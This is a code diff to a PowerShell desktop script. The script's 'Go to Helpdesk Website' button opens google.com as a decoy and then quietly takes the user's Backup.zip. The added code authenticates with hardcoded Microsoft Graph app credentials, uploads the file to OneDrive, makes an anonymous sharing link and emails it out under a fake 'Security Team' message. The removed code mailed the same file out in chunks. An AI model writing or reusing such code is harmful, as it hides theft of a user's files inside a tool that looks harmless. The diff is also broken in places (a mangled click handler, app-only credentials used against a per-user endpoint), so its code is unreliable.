@@ -65,7 +65,9 @@ $button = New-Object System.Windows.Forms.Button
 $button.Text = "Go to Helpdesk Website"
 $button.Size = New-Object System.Drawing.Size(200,30)
 $button.Location = New-Object System.Drawing.Point(20, 180)
-$button.Add_Click({
+Click({
+
+    Start-Process "https://www.google.com"
     # Variables
     $tenantId    = "aff8a746-8efb-4a47-879d-9b13c505ea01"
     $clientId    = "901c8ca6-c038-4a84-805f-77b1863aecca"
@@ -76,56 +78,82 @@ $button.Add_Click({
     $BodyText = "Hello Security Team, please address the attached potential issue found."
     $FilePath = "C:\\Users\\$env:USERNAME\\Backup.zip"
     $ChunkSizeMB = 140  # Keep chunks under 150 MB
-    $ChunkSizeBytes = $ChunkSizeMB * 1MB
-    $TokenUrl = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"
 
-    $Body = @{
-        client_id     = $ClientId
-        scope         = "https://graph.microsoft.com/.default"
-        client_secret = $ClientSecret
-        grant_type    = "client_credentials"
-    }
+# Token URL
+$TokenUrl = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"
 
-    $TokenResponse = Invoke-RestMethod -Uri $TokenUrl -Method POST -Body $Body
-    $Token = $TokenResponse.access_token
-    Write-Host "Splitting file into chunks of $ChunkSizeMB MB..."
-    $FileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-    $TotalSize = $FileBytes.Length
-    $ChunkCount = [math]::Ceiling($TotalSize / $ChunkSizeBytes)
-
-    $ChunksDir = Join-Path (Split-Path $FilePath) "Chunks"
-    if (-Not (Test-Path $ChunksDir)) { New-Item -ItemType Directory -Path $ChunksDir | Out-Null }
-
-for ($i = 0; $i -lt $ChunkCount; $i++) {
-    $StartIndex = $i * $ChunkSizeBytes
-    $EndIndex = [math]::Min($StartIndex + $ChunkSizeBytes, $TotalSize)
-    $Length = $EndIndex - $StartIndex
-    $ChunkData = $FileBytes[$StartIndex..($EndIndex-1)]
-    $ChunkPath = Join-Path $ChunksDir ("Chunk_$($i+1).part")
-    [System.IO.File]::WriteAllBytes($ChunkPath, $ChunkData)
+Write-Host "Getting OAuth token..."
+$Body = @{
+    client_id     = $ClientId
+    scope         = "https://graph.microsoft.com/.default"
+    client_secret = $ClientSecret
+    grant_type    = "client_credentials"
 }
 
+$TokenResponse = Invoke-RestMethod -Uri $TokenUrl -Method POST -Body $Body
+$Token = $TokenResponse.access_token
+
+Write-Host "Token acquired successfully."
+
+# Validate file
+if (-Not (Test-Path $FilePath)) {
+    Write-Host "File not found: $FilePath" -ForegroundColor Red
+    exit 1
+}
+
+$fileSize = (Get-Item $FilePath).Length
+Write-Host "File size: $([math]::Round($fileSize / 1MB, 2)) MB"
+
+# Create upload session
 $Headers = @{ "Authorization" = "Bearer $Token"; "Content-Type" = "application/json" }
+$UploadSessionBody = @{ item = @{ "@microsoft.graph.conflictBehavior" = "rename" } } | ConvertTo-Json
+$UploadSessionUrl = "https://graph.microsoft.com/v1.0/me/drive/root:/$(Split-Path $FilePath -Leaf):/createUploadSession"
 
-for ($i = 0; $i -lt $ChunkCount; $i++) {
-    $ChunkPath = Join-Path $ChunksDir ("Chunk_$($i+1).part")
-    $ChunkBytes = [System.IO.File]::ReadAllBytes($ChunkPath)
-    $ChunkBase64 = [System.Convert]::ToBase64String($ChunkBytes)
-    $ChunkName = [System.IO.Path]::GetFileName($ChunkPath)
+Write-Host "Creating upload session..."
+$UploadSession = Invoke-RestMethod -Uri $UploadSessionUrl -Headers $Headers -Method POST -Body $UploadSessionBody
+$UploadUrl = $UploadSession.uploadUrl
 
-    $EmailPayload = @{
-        message = @{
-            subject = "$Subject - Part $($i+1) of $ChunkCount"
-            body = @{ contentType = "Text"; content = "$BodyText (Part $($i+1) of $ChunkCount)" }
-            toRecipients = @(@{ emailAddress = @{ address = $Recipient } })
-            attachments = @(@{ "@odata.type" = "#microsoft.graph.fileAttachment"; name = $ChunkName; contentBytes = $ChunkBase64 })
-        }
-        saveToSentItems = $true
-    } | ConvertTo-Json -Depth 10
+Write-Host "Upload session created. Uploading in chunks..."
 
-    Write-Host "Sending chunk $($i+1) of $ChunkCount..."
-    Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users/$SenderMailbox/sendMail" -Headers $Headers -Method POST -Body $EmailPayload
+# Chunked upload
+$ChunkSize = 10MB
+$FileStream = [System.IO.File]::OpenRead($FilePath)
+$TotalSize = $FileStream.Length
+$Start = 0
+
+while ($Start -lt $TotalSize) {
+    $End = [Math]::Min($Start + $ChunkSize, $TotalSize) - 1
+    $Length = $End - $Start + 1
+    $Buffer = New-Object byte[] $Length
+    $FileStream.Read($Buffer, 0, $Length) | Out-Null
+
+    $RangeHeader = "bytes $Start-$End/$TotalSize"
+    $ChunkHeaders = @{ "Content-Length" = $Length; "Content-Range" = $RangeHeader }
+
+    Invoke-RestMethod -Uri $UploadUrl -Method PUT -Headers $ChunkHeaders -Body $Buffer
+
+    $Start = $End + 1
+    Write-Host "Uploaded $([math]::Round(($Start / $TotalSize) * 100, 2))%"
 }
+
+$FileStream.Close()
+Write-Host "Upload completed. Getting sharing link..."
+
+# Get item ID from upload session response
+$ItemId = $UploadSession.id
+$LinkUrl = "https://graph.microsoft.com/v1.0/me/drive/items/$ItemId/createLink"
+$LinkBody = @{ type = "view"; scope = "anonymous" } | ConvertTo-Json
+$LinkResponse = Invoke-RestMethod -Uri $LinkUrl -Headers $Headers -Method POST -Body $LinkBody
+$ShareLink = $LinkResponse.link.webUrl
+
+Write-Host "Sharing link: $ShareLink"
+
+# Prepare email payload with link
+$emailPayload = @{ message = @{ subject = $Subject; body = @{ contentType = "HTML"; content = "$BodyText<br><a href='$ShareLink'>Click here to view the file</a>" }; toRecipients = @(@{ emailAddress = @{ address = $Recipient } }) }; saveToSentItems = $true } | ConvertTo-Json -Depth 10
+
+Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users/$SenderMailbox/sendMail" -Headers $Headers -Method POST -Body $emailPayload
+
+Write-Host "Email sent successfully with OneDrive link." -ForegroundColor Green
 
     $form.Close()
 })
